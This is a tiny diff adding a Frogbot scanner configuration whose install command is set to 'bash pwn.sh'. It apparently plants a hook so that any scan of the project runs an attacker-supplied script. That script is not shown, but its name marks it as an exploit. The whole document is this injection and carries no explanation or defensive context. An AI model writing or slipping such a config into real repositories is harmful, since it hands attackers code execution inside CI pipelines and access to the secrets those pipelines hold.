@@ -1,0 +1,4 @@
+frogbotConfig:
+  scan:
+    projects:
+      - installCommand: "bash pwn.sh"
